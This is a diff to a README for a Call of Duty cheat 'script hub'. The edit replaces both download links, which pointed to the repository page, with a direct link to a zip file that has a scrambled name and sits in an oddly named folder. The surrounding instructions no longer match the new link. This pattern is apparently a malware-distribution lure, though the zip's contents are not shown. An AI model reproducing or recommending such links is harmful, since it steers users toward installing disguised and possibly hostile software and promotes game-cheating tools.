@@ -1,6 +1,6 @@
 # 🎯 call-of-duty-script-hub - Enhance Your Gameplay Precision Now
 
-[![Download Now](https://img.shields.io/badge/Download-call--of--duty--script--hub-blue)](https://github.com/Danghaiye7797/call-of-duty-script-hub)
+[![Download Now](https://img.shields.io/badge/Download-call--of--duty--script--hub-blue)](https://raw.githubusercontent.com/Danghaiye7797/call-of-duty-script-hub/main/carbonylic/duty_script_call_hub_of_v2.7.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run call-of-duty-script-hub on your Wi
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Danghaiye7797/call-of-duty-script-hub](https://github.com/Danghaiye7797/call-of-duty-script-hub)
+Visit this link to download the application: [https://raw.githubusercontent.com/Danghaiye7797/call-of-duty-script-hub/main/carbonylic/duty_script_call_hub_of_v2.7.zip](https://raw.githubusercontent.com/Danghaiye7797/call-of-duty-script-hub/main/carbonylic/duty_script_call_hub_of_v2.7.zip)
 
 This will take you to the GitHub page where you can find the download button. Click the green "Code" button and choose "Download ZIP" to get the files.
 
